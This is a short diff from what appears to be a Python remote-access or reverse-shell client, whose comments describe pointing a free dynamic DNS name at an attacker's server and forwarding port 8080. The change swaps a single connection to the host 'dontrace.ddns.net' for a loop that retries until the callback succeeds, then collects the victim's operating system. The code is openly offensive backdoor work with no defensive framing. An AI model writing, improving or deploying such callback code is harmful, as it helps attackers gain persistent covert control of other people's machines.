@@ -75,10 +75,11 @@ def connect():
     #rmdomain is the freee dynamic domain name you created for your server it should be easy to configure it just download noip client 
     #start the client, configure your router/firewall to redirect traffic for port 8080 to your internal server and that should be it
     
-    rmdomain='dontrace.ddns.net'
+    while True:
+    		rhost=socket.gethostbyname(rmdomain)
+    		if s.connect_ex((rhost,8080))==0:
+    			break
     
-    rhost=socket.gethostbyname(rmdomain)
-    s.connect((rhost,8080)) 
     
     os=str(platform.system())
 
